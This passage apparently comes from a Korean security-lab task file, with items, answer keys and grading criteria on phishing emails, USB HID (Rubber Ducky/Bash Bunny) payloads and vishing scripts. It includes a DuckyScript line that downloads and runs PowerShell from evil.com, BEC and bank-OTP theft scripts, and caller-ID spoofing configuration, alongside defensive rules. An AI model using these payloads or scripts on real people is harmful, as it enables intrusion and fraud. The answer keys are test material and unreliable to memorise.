      - "Red Flag 5 가지 분석 — echo '=== 본 메일의 Red Flag ==='; echo '1. 발신 도메인 의심: company-internal.com (자사 X)'; echo '2. 외부 링크: evil-site.com → reset path'; echo '3. 긴급성: \"24시간 내\"'; echo '4. 본인 정보 입력 유도: \"비밀번호 갱신\"'; echo '5. 일반 인사 (이름 X): \"안녕하세요\"'; echo '[정상 메일은]: 자사 도메인 + SSO 링크 + 이름 명시'. 출력: 5 red flag + 정상 비교. 해석: 학생이 동일 메일 받았을 때 5점 체크리스트로 차단. 1~2점만 매치되어도 #phishing-report 신고 권장."
      - "BEC (CEO 사칭) 변형 — cat > /tmp/phish_bec.eml <<'EOF'\\nFrom: CEO Kim <kim.ceo@company-vendor.com>\\nTo: cfo@company.com\\nSubject: [URGENT] 거래처 송금 — 회의 중\\n\\n김부장님,\\n현재 외부 회의 중인데, ABC 거래처에 긴급 송금 필요합니다.\\n계좌: 110-0000-0000-00 (ABC Trading)\\n금액: \\$45,000 (USD)\\n오늘 17:00 마감, 회의 끝나면 확인합니다.\\n감사합니다, 김CEO\\nEOF\\necho '[OK] BEC template (CEO impersonation)'. 출력: BEC 메일. 해석: BEC = Business Email Compromise. CEO/CFO 사칭. FBI IC3 2023 손실 \\$2.7B. Authority + Scarcity + Trust (CEO 명시). 검증 SOP = 직통 콜백 강제."
      - "택배 사칭 (smishing 변형) — cat > /tmp/phish_pkg.eml <<'EOF'\\nFrom: CJ대한통운 <noreply@cj-delivery-track.com>\\nTo: customer@gmail.com\\nSubject: [CJ대한통운] 배송 불가 - 주소 확인 필요\\n\\n고객님 안녕하세요,\\n주문하신 상품 [송장번호 1234567890] 배송 시도 중 주소 불일치로 반송 예정입니다.\\n아래 링크에서 주소를 확인해주세요:\\nhttps://cj-track.bit.ly/3xyz\\n7일 이내 미확인 시 자동 반송됩니다.\\nEOF\\necho '[OK] 택배 사칭 템플릿'. 출력: 한국 환경 phishing. 해석: 한국 #1 phishing 패턴. KISA 보호나라 통계 2024 신고의 35%. bit.ly 단축 + 7일 압박. 노년층 피해 다수."
      - "GoPhish 템플릿 형식 — cat > /tmp/gophish_template.json <<'EOF'\\n{\\n  \"name\": \"IT Password Reset Q1 2026\",\\n  \"subject\": \"[긴급] 비밀번호 만료 예정\",\\n  \"html\": \"<p>안녕하세요, IT 보안팀입니다...</p><p><a href=\\\\\"{{.URL}}\\\\\">갱신하기</a></p>\",\\n  \"attachments\": [],\\n  \"envelope_sender\": \"security@company-internal.com\"\\n}\\nEOF\\necho '[OK] GoPhish 템플릿 JSON'. 출력: GoPhish 형식. 해석: {{.URL}} = GoPhish 변수 (각 수신자별 추적 링크). {{.FirstName}} 도 가능. 모의피싱 도구는 추적 + 통계 자동화 — 학생이 분기 캠페인 운영 시 GoPhish 표준."
      - "다국어 변형 (영문/한글/일본어) — cat > /tmp/phish_multi.txt <<'EOF'\\n[KO] [긴급] 비밀번호 만료 예정 - 즉시 갱신\\n[EN] [URGENT] Password Expiry - Immediate Reset Required\\n[JA] 【緊急】パスワード期限切れ - 今すぐリセット\\n[ZH] 【紧急】密码即将过期 - 立即重置\\nEOF\\necho '[OK] 4 lang variants'. 출력: 4 언어 동일 메시지. 해석: 글로벌 BPO/대기업 환경 = 다국어 phishing. 사용자 언어 자동 감지 (HTTP Accept-Language) → 맞춤 전송. T1566.001 multi-language."
      - "방어 — DMARC + 게이트웨이 + 사용자 신고 — echo '[3 layer 방어]'; echo '[Layer 1] DMARC reject'; echo '  - From 도메인 위조 차단 (자사 도메인)'; echo '  - 본 메일은 company-internal.com → 자사 X → DMARC 비대상 (한계)'; echo '[Layer 2] 게이트웨이 (Mimecast/Proofpoint)'; echo '  - URL rewrite + sandbox + sender reputation'; echo '  - bit.ly + 외부 도메인 자동 차단'; echo '[Layer 3] 사용자 신고'; echo '  - Outlook \"Report Phishing\" 버튼'; echo '  - Slack #phishing-report 채널'; echo '  - 분기 모의피싱으로 신고율 측정'. 출력: 3 layer. 해석: DMARC 가 1차 (자사 도메인 위조), 게이트웨이가 2차 (외부 도메인), 사용자가 최후. 3 layer 부족 단일 방어 X."
      negative_signs:
      - From/Subject/본문 + 링크 구조 누락
      - Cialdini 원칙 활용 분석 (Authority/Scarcity/Fear) 누락
      - Red flag 5 가지 체크리스트 X
      - BEC (CEO 사칭) 또는 택배 사칭 변형 0개
      - GoPhish 템플릿 형식 (JSON) 누락
      - DMARC + 게이트웨이 + 사용자 신고 3 layer 방어 X
  target_vm: attacker
- order: 8
  instruction: USB 기반 공격(Rubber Ducky, BadUSB)의 원리를 설명하고, 간단한 HID 공격 페이로드를 작성하라.
  hint: USB HID(Human Interface Device)로 키보드 입력을 자동화한다
  category: analysis
  points: 10
  answer: 'echo -e ''=== USB HID Attack (Rubber Ducky) ===\n\n[Principle]\n- USB device emulates keyboard\n-
    Injects keystrokes at high speed\n- No user interaction needed (auto-executes)\n\n[DuckyScript Example]\nDELAY
    1000\nGUI r\nDELAY 500\nSTRING powershell -w hidden -c "IEX(IWR http://evil.com/payload.ps1)"\nENTER\n\n[Attack
    Flow]\n1. Victim plugs in USB\n2. OS recognizes as keyboard\n3. Keystrokes open terminal\n4. Downloads
    and executes payload\n5. Total time: ~3 seconds\n\n[Defense]\n- USB device whitelisting (Group Policy)\n-
    Endpoint detection (EDR)\n- Disable autorun\n- Physical security awareness'''
  answer_detail: Rubber Ducky는 USB 키보드를 에뮬레이션하여 사전 프로그래밍된 키 입력을 자동 실행한다. OS는 이를 정상 키보드로 인식하므로 기존 보안 소프트웨어로
    차단하기 어렵다. USB 장치 화이트리스팅이 효과적인 방어책이다.
  verify:
    type: output_contains
    expect: USB HID Attack
    field: stdout
    semantic:
      intent: 'USB HID 공격 — Rubber Ducky/BadUSB. USB가 키보드 에뮬레이션 → 사전 프로그래밍된 키 입력. DuckyScript: GUI r +
        powershell IEX(IWR url) + ENTER. 약 3초. MITRE T1200 Hardware Additions. 방어: USB 화이트리스팅(GPO)/EDR/autorun
        off.'
      success_criteria:
      - USB HID Attack 키워드
      - DuckyScript 또는 키 입력 시퀀스
      - 방어 (화이트리스팅/EDR)
      acceptable_methods:
      - "USB HID 클래스 원리 — echo '=== USB HID (Human Interface Device) ==='; echo 'USB Device Class 0x03 (HID)'; echo '  Sub-class: Boot Interface (키보드/마우스)'; echo '  Protocol: Keyboard / Mouse'; echo '[정상 키보드 vs Rubber Ducky]'; echo '  정상: 사람이 키 입력 (~5 keys/sec)'; echo '  Rubber Ducky: USB 가 키 입력 (~1000 keys/sec)'; echo '  OS 인식: 둘 다 Class 0x03 → 차단 어려움'; echo '[VID/PID]'; echo '  lsusb 로 확인 — Bus 001 Device 003: ID 03eb:2401 (Atmel Corp)'. 출력: HID 클래스 + 인식 차이. 해석: HID 는 OS 무허가 자동 인식 — 가장 큰 보안 한계. T1200 Hardware Additions. lsusb 확인 가능."
      - "DuckyScript 페이로드 작성 — cat > /tmp/payload.duck <<'DUCKEOF'\\nDELAY 1000\\nGUI r\\nDELAY 500\\nSTRING powershell -w hidden -c \"IEX(IWR http://10.20.30.201:8080/payload.ps1)\"\\nENTER\\nDELAY 2000\\nSTRING exit\\nENTER\\nDUCKEOF\\necho '[DuckyScript]'; cat /tmp/payload.duck; echo '---'; echo '[DELAY] 밀리초 대기'; echo '[GUI r] Win+R 단축키'; echo '[STRING] 문자열 입력'; echo '[ENTER] Enter 키'. 출력: 페이로드 + 명령 의미. 해석: DuckyScript = Hak5 Rubber Ducky 의 DSL. GUI r = Win+R (실행 창). PowerShell -w hidden = 윈도우 숨김. IEX(IWR) = 다운로드+즉시 실행. 약 3.5초 완료."
      - "Bash Bunny 다중 페이로드 — cat > /tmp/payload.bb <<'BBEOF'\\n#!/usr/bin/env bash\\n# Bash Bunny — Linux\\nLED ATTACK\\nATTACKMODE HID STORAGE\\nQUACK STRING powershell -ep bypass -c \"IEX(IWR /Volumes/BB/payload.ps1)\"\\nQUACK ENTER\\nLED FINISH\\nBBEOF\\necho '[Bash Bunny payload]'; cat /tmp/payload.bb; echo '---'; echo 'ATTACKMODE HID STORAGE: 키보드 + USB 드라이브 동시'; echo 'QUACK = DuckyScript 명령'; echo 'LED: 상태 표시 (작업 중/완료)'. 출력: Bash Bunny 코드. 해석: Hak5 Bash Bunny = Linux 기반 USB attack 플랫폼. HID + Storage + Network 동시 가능. payload.ps1 을 자체 USB 에서 직접 실행."
      - "OMG Cable + 무선 제어 — echo '[OMG Cable]'; echo '  https://o.mg.lol/'; echo '  외형: 정상 USB-C 케이블'; echo '  내부: WiFi + 키보드 에뮬레이터'; echo '  공격자 원격 제어 (web UI)'; echo '[흐름]'; echo '  1. 피해자 USB-C 사용 (충전·동기화 인지)'; echo '  2. 공격자 → WiFi → cable web UI'; echo '  3. 임의 키 입력 명령 → 피해자 PC 실행'; echo '  4. 격리 환경 (회의실) 침투 가능'; echo '[탐지]'; echo '  - 케이블 X-ray (포트 스캐너 역량 X)'. 출력: OMG cable 흐름. 해석: 정상 케이블과 외형 동일 → 검출 거의 불가능. 회의실/공항 USB 충전 정책 핵심 이유."
      - "Rubber Ducky 공격 흐름 6 단계 — echo '=== USB HID 공격 6 단계 ==='; echo '1. 페이로드 작성 (DuckyScript)'; echo '2. 컴파일 (Encoder.exe payload.duck → inject.bin)'; echo '3. SD 카드 → Rubber Ducky 삽입'; echo '4. USB → 피해자 PC 삽입'; echo '5. OS HID 자동 인식 + 키 입력 자동 실행'; echo '6. 페이로드 다운 + 실행 (~3초)'; echo '[탐지 단서]'; echo '  - Win+R 자동 실행 → 화면 깜빡'; echo '  - 사용자 키보드 무반응 (USB 가 점유)'. 출력: 6 단계 + 단서. 해석: 사용자가 화면 보고 있으면 깜빡임 인지 가능 — 하지만 0.5초 미만은 못 봄. 공항/카페 USB 절대 금지."
      - "방어 — USB 화이트리스팅 (GPO + udev) — echo '[Windows GPO]'; echo '  Computer Configuration → Administrative Templates → System → Device Installation'; echo '  Allow installation of devices that match these device IDs'; echo '  USB\\\\VID_046D&PID_C31C → Logitech 키보드만'; echo '[Linux udev]'; echo '  /etc/udev/rules.d/99-usb-whitelist.rules'; echo '  ACTION==\"add\", SUBSYSTEM==\"usb\", ATTRS{idVendor}==\"03eb\", RUN+=\"/bin/echo deny > /sys/.../authorized\"'; echo '[USBGuard daemon]'; echo '  apt install usbguard; usbguard generate-policy > /etc/usbguard/rules.conf'. 출력: 3 방어. 해석: 화이트리스트가 가장 효과적. VID/PID 등록 외 차단 = HID 도 막음."
      - "EDR / 행위 탐지 — echo '[EDR 탐지 룰]'; echo '1. powershell -w hidden -c IEX(IWR url) 패턴'; echo '2. 짧은 시간 내 다수 키 입력 (1000+/sec)'; echo '3. Win+R + powershell 시퀀스'; echo '4. USB 삽입 후 1초 내 실행'; echo '[Sigma rule]'; cat <<SIGEOF\\ntitle: USB HID Attack — Rapid PowerShell\\nlogsource: { product: windows, service: powershell }\\ndetection:\\n  selection: { CommandLine|contains: ['-w hidden', 'IWR', 'IEX'] }\\n  timeframe: 1s\\n  condition: selection\\nlevel: high\\nSIGEOF. 출력: EDR + Sigma. 해석: 행위 탐지 (EDR) 가 화이트리스트 보완. PowerShell + IEX + IWR 조합은 거의 100% 악성."
      - "물리 보안 + 직원 교육 — echo '[물리 통제]'; echo '1. USB 포트 봉인 (실리콘/잠금)'; echo '2. 회의실 USB 충전기 X (콘센트 only)'; echo '3. 공항/카페 USB 금지 정책'; echo '4. 회사 지급 USB 만 사용'; echo '[직원 교육]'; echo '1. 길거리 USB 절대 금지 (baiting)'; echo '2. 발견 시 IT 부서 신고'; echo '3. 출장 시 데이터 USB 만 (HID X)'; echo '[Stuxnet 사례]'; echo '  USB 4개로 이란 핵시설 1년 침투'; echo '  - 발견 후 USB 전체 정책 강화'. 출력: 물리 + 교육 + 사례. 해석: 기술 통제 + 인적 통제 둘 다. Stuxnet (2010) 이 USB 공격의 가장 유명한 실 사례."
      negative_signs:
      - HID 원리 (Class 0x03/키보드 에뮬레이션) 누락
      - DuckyScript 또는 Bash Bunny 페이로드 코드 X
      - VID/PID 화이트리스트 (GPO/udev/USBGuard) 누락
      - EDR / Sigma 행위 탐지 룰 X
      - OMG Cable / Stuxnet 등 실 도구·사례 X
      - 물리 통제 + 직원 교육 양면 X
  target_vm: attacker
- order: 9
  instruction: Vishing(Voice Phishing) 시나리오를 작성하라. 은행 직원을 사칭하여 OTP를 탈취하는 대본을 만들어라.
  hint: 전화 기반 소셜 엔지니어링의 대본 형식으로 작성한다
  category: analysis
  points: 10
  answer: 'echo -e ''=== Vishing Scenario: Bank OTP Theft ===\n\n[Pretext]\n공격자: 은행 사기예방팀을 사칭\n\n[Script]\n"안녕하세요,
    OO은행 사기예방팀 김민수입니다.\n고객님 계좌에서 해외 송금 시도가 감지되었습니다.\n본인 확인을 위해 지금 수신되는 인증번호를 알려주시겠습니까?"\n\n(공격자는 동시에 피해자
    계정으로 로그인 시도 -> OTP 발송)\n\n"네, 확인 감사합니다. 해외 송금을 차단 처리했습니다."\n\n[Analysis]\n- Authority: 은행 사기예방팀\n-
    Fear: 해외 송금 감지\n- Urgency: 즉시 확인 필요\n- Trust: 친절한 톤, 전문 용어\n\n[Defense]\n- 은행은 전화로 OTP를 요구하지 않음\n-
    직접 은행 대표번호로 확인 전화\n- 인증번호는 절대 타인에게 공유 금지'''
  answer_detail: Vishing은 전화를 이용한 피싱으로, 실시간 대화에서 피해자의 반응에 맞춰 시나리오를 조정할 수 있어 이메일 피싱보다 성공률이 높을 수 있다. 금융기관은
    전화로 인증 정보를 요구하지 않는다는 원칙을 교육해야 한다.
  verify:
    type: output_contains
    expect: Vishing Scenario
    field: stdout
    semantic:
      intent: 'Vishing 시나리오 — 은행 사기예방팀 사칭 + 해외 송금 감지(공포) + OTP 요청 + 동시에 피해자 계정 로그인 → OTP 탈취. Authority
        + Fear + Urgency + Trust 원칙. 방어: 은행은 전화로 OTP 미요청 + 대표번호 직접 콜백.'
      success_criteria:
      - Vishing Scenario 키워드
      - 대본 형식 + Pretext 설정
      - Authority/Fear/Urgency 분석 + 방어
      acceptable_methods:
      - "Pretext 설계 + 대본 — cat > /tmp/vishing_script.txt <<'EOF'\\n=== Vishing: 은행 OTP 탈취 ===\\n[Pretext] OO은행 사기예방팀 김민수 사칭\\n[Target] 일반 고객 (40~60대 권장)\\n[준비물]\\n  - 발신번호 spoofing (1588-XXXX 은행 대표번호)\\n  - 배경음 (콜센터 잡음 BGM)\\n  - 동시 작업: 피해자 계정 로그인 시도\\n\\n[대본]\\n공격자: \"안녕하세요, OO은행 사기예방팀 김민수입니다. 고객님 계좌에서 해외 송금 시도가 감지되어 본인 확인 부탁드립니다.\"\\n피해자: \"네? 무슨 송금이요?\"\\n공격자: \"\\$5,000 USD 베트남 송금 시도입니다. 즉시 차단 처리 위해 본인 확인 인증번호 발송했습니다. 받으셨나요?\"\\n피해자: \"네, 받았습니다.\" (동시에 공격자가 피해자 계정 로그인 → OTP 발송)\\n공격자: \"인증번호 6자리 알려주세요.\"\\n피해자: \"123456\"\\n공격자: \"확인 감사합니다. 송금 차단 처리했습니다.\"\\n→ 공격자가 이미 OTP 입력 → 송금 성공\\nEOF\\necho '[OK] Vishing script'; head -10 /tmp/vishing_script.txt. 출력: 대본 + 첫 10줄. 해석: 실시간 대화 + 상황 적응이 vishing 특징. 사전 OSINT (이름·계좌) 가 핵심 신뢰 요소."
      - "Cialdini 원칙 분석 — echo '=== 본 vishing 의 심리 조작 ==='; echo 'Authority: \"OO은행 사기예방팀\" + 김민수 이름'; echo 'Fear: \"\\$5,000 해외 송금\" (큰 손실 위협)'; echo 'Urgency: \"즉시 차단\" (시간 압박)'; echo 'Trust: 친절·전문 용어·정확한 절차'; echo 'Reciprocity: \"차단 처리해드림\" 호의 인지'; echo 'Commitment: 인증번호 알려준 후 되돌리기 어려움'; echo '[6원칙 중 6 모두 활용 — 가장 강력]'. 출력: 6/6 활용. 해석: 이메일 phishing 보다 vishing 이 더 강력 — 실시간 + 다중 원칙 동시. 성공률 30~40% (이메일 5%)."
      - "VoIP spoofing 도구 (Asterisk) — echo '[발신번호 위조 — Asterisk]'; echo 'cat /etc/asterisk/extensions.conf'; echo '[outbound]'; echo 'exten => _NXXNXXXXXX,1,Set(CALLERID(num)=15881111)'; echo '              ,2,Dial(SIP/trunk/${EXTEN})'; echo '[원리]'; echo '  - SIP INVITE 의 From 헤더 조작'; echo '  - PSTN 게이트웨이 가 그대로 전달'; echo '  - 피해자 발신번호 화면에 1588-1111 (은행 대표) 표시'; echo '[방어 — STIR/SHAKEN]'; echo '  - SIP 호출 인증서 (FCC 강제 미국)'; echo '  - 한국 KISA 도 도입 진행'. 출력: Asterisk + 인증. 해석: 한국에서도 통신 3사 발신번호 위조 차단 강화 중 (2024 STIR/SHAKEN)."
      - "AI Voice Cloning (Deepfake) — echo '[Deepfake 음성 도구]'; echo '  - ElevenLabs (Voice cloning, 30초 sample)'; echo '  - Microsoft VALL-E (3초 sample)'; echo '  - tortoise-tts (오픈소스)'; echo '[흐름]'; echo '  1. 피해자 가족·CEO 음성 sample 30초 (SNS 동영상)'; echo '  2. ElevenLabs 학습 → 음성 모델'; echo '  3. \"엄마, 나 사고났어\" 텍스트 → 자식 음성 생성'; echo '  4. 부모 vishing 통화 → 입금 유도'; echo '[2024 사례]'; echo '  - 홍콩 다국적기업 \\$25M 사기 (CFO Deepfake 영상통화)'; echo '  - FBI IC3 2024 — voice cloning 신고 +400%'. 출력: 도구 + 사례. 해석: AI 발달로 vishing 난도 ↓. 30초 음성으로 가족 사칭."
      - "한국 시나리오 변형 — cat > /tmp/vishing_kr.txt <<'EOF'\\n[Case 1: 검찰청 사칭]\\n\"서울중앙지검 김검사입니다. 명의도용 신고가 들어와 본인 확인 필요합니다. 안전계좌로 이체해야 자금 보호됩니다.\"\\n[Case 2: 자녀 사칭]\\n\"엄마 나 휴대폰 잃어버렸어. 친구 폰으로 연락. 급하니까 이 계좌로 30만원만 보내줘.\"\\n[Case 3: 카드사 사칭]\\n\"카드 분실 신고 접수됐습니다. 본인 확인 위해 카드번호+CVC 알려주세요.\"\\nEOF\\necho '[KR Vishing 3 cases]'. 출력: 한국 패턴 3종. 해석: 한국 #1 = 검찰청·금융감독원 사칭 (KISA 통계 2024). #2 = 자녀 사칭 (Liking + Fear). #3 = 카드사 (Authority)."
      - "vishing 탐지 — 발신번호 + 행위 — echo '[탐지 단서]'; echo '1. 발신번호 의심'; echo '   - 은행: 1588-XXXX 만 사용'; echo '   - 검찰청: 02-3480-XXXX 만'; echo '   - 발신번호 검색: whowho/T전화 앱'; echo '2. 행위 단서'; echo '   - 인증번호 요구 (절대 X)'; echo '   - 즉시 송금 압박'; echo '   - 안전계좌 이체 (사기 100%)'; echo '3. 직접 확인'; echo '   - 통화 종료 → 공식 대표번호 콜백'; echo '   - 가족 사칭 → 가족 직접 통화'. 출력: 3 layer 탐지. 해석: 첫 1분 내 인증번호·송금 요구 = 100% vishing. 공식 콜백이 최후 방어."
      - "조직 방어 — 콜센터 + 인증 SOP — echo '[금융기관 SOP]'; echo '1. \"전화로 인증번호·OTP 절대 미요청\" 자체 캠페인'; echo '2. 콜센터 발신: 사전 예약 + SMS 동시 발송'; echo '3. 의심 거래 → 내부 차단 + 고객 콜백 (콜센터 → 고객)'; echo '[조직 내 BEC 방지]'; echo '1. CEO/CFO 송금 지시 → 직통 콜백 강제'; echo '2. \\$10K 이상 → 2명 승인 (4-eye)'; echo '3. \"긴급/즉시\" 키워드 = 검증 강화 trigger'. 출력: 금융 + 조직 SOP. 해석: 한국 금융감독원 권고 + FBI BEC 방지. 4-eye 가 가장 효과적 (CFO 단독 결정 불가)."
      - "법적·윤리적 한계 — echo '[합법 — 본 lab 한정]'; echo '1. 시나리오 작성 (학습 목적)'; echo '2. 자사 모의훈련 (사전 동의)'; echo '3. 인식 교육 자료'; echo '[불법 — 정통망법 §70-2 + 형법 §347 사기]'; echo '1. 외부 대상 발신번호 위조'; echo '2. 실 인증번호 요구'; echo '3. 자금 이체 유도'; echo '[처벌] 최대 10년 징역 / 2억 벌금'; echo '[Deepfake 음성] 부정경쟁방지법 §2조 추가 적용'. 출력: 합법/불법 + 처벌. 해석: vishing 은 가장 무거운 형사처벌. Deepfake 음성도 추가 처벌. 본 lab 은 가상 시나리오 학습 한정."
      negative_signs:
      - Pretext + 대본 형식 누락
      - Authority/Fear/Urgency 등 6원칙 활용 분석 X
      - VoIP spoofing (Asterisk/SIP) 도구 인용 X
      - AI Voice Cloning (Deepfake/ElevenLabs) 미언급
      - 한국 패턴 (검찰청/자녀/카드사) 변형 0개
      - 4-eye / 콜백 SOP 등 조직 방어 X
      - 법적 처벌 (정통망법/형법) 명시 X
